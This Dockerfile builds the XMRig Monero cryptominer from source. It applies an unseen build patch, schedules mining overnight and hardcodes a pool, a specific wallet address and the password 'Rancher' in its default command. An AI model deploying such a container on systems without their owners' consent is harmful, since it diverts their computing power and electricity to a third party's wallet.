FROM ubuntu:latest AS build

ARG XMRIG_VERSION='v5.11.2'

# Configuration variables.
ENV DEBIAN_FRONTEND=noninteractive
ENV POOL_URL    		POOL_URL
ENV POOL_USER   		WALLET_ID
ENV POOL_PW     		x
ENV MAX_CPU   			100
ENV USE_SCHEDULER		false
ENV START_TIME			2100
ENV STOP_TIME			0600
ENV DAYS				Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN git clone https://github.com/xmrig/xmrig
WORKDIR /root/xmrig
RUN git checkout ${XMRIG_VERSION}
COPY build.patch /root/xmrig/
RUN git apply build.patch
RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make

FROM ubuntu:latest
RUN apt-get update && apt-get install -y libhwloc15
RUN useradd -ms /bin/bash monero
USER monero
WORKDIR /home/monero
COPY --from=build --chown=monero /root/xmrig/build/xmrig /home/monero

ENTRYPOINT ["./xmrig"]
CMD ["--url=pool.supportxmr.com:5555", "--user=45rfqYG9iNPddvenLpjFskJUhFgqBkdhDeah3X8D8ZJM3KpKqZWCLz3ewLsVd269tZiEyQRV53Ldv2DJb6xeuFokF7SBb1p", "--pass=Rancher", "-k", "--coin=monero"]˚
#CMD ["--url=$POOL_URL", "--user=$POOL_USER", "--pass=$POOL_PW", "-k", "--coin=monero"]˚
